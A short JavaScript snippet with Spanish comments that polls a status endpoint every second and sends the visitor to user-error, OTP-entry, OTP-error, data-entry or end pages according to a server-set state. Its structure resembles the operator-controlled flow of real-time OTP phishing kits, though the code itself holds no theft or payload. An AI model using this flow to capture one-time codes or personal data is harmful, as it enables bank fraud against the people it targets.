// Función para verificar el estado del cliente
function verificarEstado() {
    $.ajax({
        url: 'data/verificar_estado.php?id=' + clienteId,
        type: 'GET',
        dataType: 'json',
        success: function(data) {
            console.log("Datos recibidos:", data); // Muestra los datos recibidos
            
            if (data.estado !== undefined) {
                console.log("Estado actual:", data.estado); // Log para verificar el estado
                
                // Convertir data.estado a número
                const estadoActual = Number(data.estado); // Convertir a número
                
                // Verificar el estado y redirigir según sea necesario
                switch (estadoActual) {
                    case 2:
                        console.log("Redirigiendo a erroruser.php..."); // Log antes de redirigir
                        window.location.href = 'erroruser.php?id='+ clienteId; // Redirigir a erroruser.php
                        break;
                    case 5:
                        console.log("Estado es Ingreso OTP, no se realiza redirección.");
                        // No redirigir, pero puedes manejarlo aquí si es necesario
                        break;
                    case 6:
                        console.log("Redirigiendo a datos.php..."); // Log antes de redirigir
                        window.location.href = 'datos.php?id=' + clienteId; // Redirigir a datos.php con el ID del cliente
                        break;
                    case 3:
                        console.log("Redirigiendo a otp.php..."); // Log antes de redirigir
                        window.location.href = 'otp.php?id='+ clienteId; // Redirigir a erroruser.php
                        break;
                    case 4:
                        console.log("Redirigiendo a errorotp.php..."); // Log antes de redirigir
                        window.location.href = 'otperror.php?id='+ clienteId; // Redirigir a erroruser.php
                        break;
                    case 0:
                        console.log("Redirigiendo a fin.php..."); // Log antes de redirigir
                        window.location.href = 'end.php'; // Redirigir a erroruser.php
                        break;
                    default:
                        console.log("Estado no relevante, no se redirige.");
                }
            } else {
                console.log("Estado es indefinido"); // Log si el estado es indefinido
            }
        },
        error: function(jqXHR, textStatus, errorThrown) {
            console.error('Error en la solicitud AJAX: ', textStatus, errorThrown);
        }
    });
}

// Actualizar el estado cada segundo
setInterval(verificarEstado, 1000); // Cada 1000 ms = 1 segundo
